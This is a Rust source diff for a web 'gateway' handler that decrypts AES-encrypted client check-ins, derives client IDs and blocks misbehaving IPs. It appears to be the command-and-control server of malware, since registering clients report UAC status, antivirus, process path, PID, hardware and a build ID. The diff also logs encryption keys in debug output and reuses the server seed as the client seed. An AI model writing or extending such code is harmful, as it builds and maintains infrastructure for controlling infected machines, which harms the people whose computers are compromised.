@@ -56,28 +56,50 @@ pub async fn gateway(params: web::Path<String>, req_body: String, req: HttpReque
     match connection_type {
         HANDSHAKE_P2 => {  // Handle client data being inputted into db and handle registered client traffic
 
-            let encryption_key = match get_encryption_key_from_ip(&mut connection, &ip).await {
-                Ok(r) => r,
-                Err(GenericError::_Expired) => {
-                    block_client(&mut connection, "N/A", "Submitted registration using expired key.", &ip, 0).await;
-                    return resp_unauthorised();
-                },
-                Err(_) => {
-                    block_client(&mut connection, "N/A", "Handshake P2 submitted with invalid encryption key.", &ip, 0).await;
-                    return resp_unauthorised();
-                }
+            let split_body = req_body.split(".").collect::<Vec<&str>>();
+
+            let (encryption_key, is_registering) = if split_body.len() == 1 {
+                (match get_encryption_key_from_ip(&mut connection, &ip).await {
+                    Ok(r) => r,
+                    Err(GenericError::_Expired) => {
+                        block_client(&mut connection, "N/A", "The encryption key associated with this IP has expired.", &ip, 1200).await;
+                        return resp_unauthorised();
+                    },
+                    Err(_) => {
+                        block_client(&mut connection, "N/A", "Unable to get encryption key from IP", &ip, 1200).await;
+                        return resp_unauthorised();
+                    }
+                }, true)
+            } else {
+                let client_id = split_body[0];
+               ( match get_encryption_key(&mut connection, &client_id).await {
+                    Ok(r) => r,
+                    Err(GenericError::_Expired) => {
+                        block_client(&mut connection, client_id, "The encryption key associated with this Client ID has expired.", &ip, 1200).await;
+                        return resp_unauthorised();
+                    },
+                    Err(_) => {
+                        block_client(&mut connection, client_id, "Unable to get encryption key from Client ID", &ip, 1200).await;
+                        return resp_unauthorised();
+                    }
+                }, false)
             };
 
-            fprint("debug", &format!("{} resolved encryption key using ip {}", &ip.magenta(), encryption_key.magenta()));
+            let req_body = if !is_registering {
+                split_body[1].to_owned()
+            } else {
+                req_body.clone()
+            };
+
+            fprint("debug", &format!("Encryption key for this request: {}", encryption_key));
 
             let decrypted_payload_content = match aes_256cbc_decrypt(&req_body, encryption_key.as_bytes()) {
                 Ok(r) => r,
                 Err(_) => {
-                    block_client(&mut connection, "N/A", "Sent a request with an invalid AES key.", &ip, 0).await;
+                    block_client(&mut connection, "N/A", "Sent a request with an invalid AES key.", &ip, 1200).await;
                     return resp_badrequest();
                 }
             };
-
 
             let submitted_json = match serde_json::from_str(str::from_utf8(&decrypted_payload_content).unwrap()) {
                 Ok(result) => result,
@@ -89,22 +111,16 @@ pub async fn gateway(params: web::Path<String>, req_body: String, req: HttpReque
 
             fprint("debug", &format!("{} sent P2 json: {}", &ip.magenta(), submitted_json));
             
-            let (client_id, is_registering) = {
-                if all_keys_valid(&submitted_json, // If client registering
-                    vec!["version", "uac", "username", "guid", "cpu", "gpu", "ram", "antivirus", "path", "pid", "build_id"],
-                    vec!["u64", "bool", "String", "String", "String", "String", "u64", "String", "String", "u64", "String"]
-                ) {
-                   (&String::from(&sha256::digest(format!("{}{}{}", 
+            let client_id = {
+               if is_registering {
+                  &String::from(&sha256::digest(format!("{}{}{}", 
                    key_to_string(&submitted_json, "guid"), 
                    key_to_string(&submitted_json, "username"),
-                   &*API_SECRET.read().unwrap()
-               ))[..16]), true)
-                } else {
-                    (&ip_to_client_id(&mut connection, &ip).await, false)
-                }
+                   &*API_SECRET.read().unwrap())))
+               } else {
+                split_body[0]
+               }
             };
-
-            fprint("debug", &format!("{} resolved client id via ip {}", &ip.magenta(), client_id.magenta()));
 
             if !is_registering {
                 if is_client(&mut connection, client_id).await {    
@@ -513,7 +529,7 @@ pub async fn gateway(params: web::Path<String>, req_body: String, req: HttpReque
             }
             
             let server_bytes: &Vec<u8> = all_bytes.choose(&mut rand::thread_rng()).unwrap();
-            let client_seed: &Vec<u8> = server_bytes; //all_bytes.choose(&mut rand::thread_rng()).unwrap();
+            let client_seed: &Vec<u8> = server_bytes; // all_bytes.choose(&mut rand::thread_rng()).unwrap();
 
             fprint("debug", &format!("{} generated server seed {:?}", &ip.magenta(), &server_bytes));
 
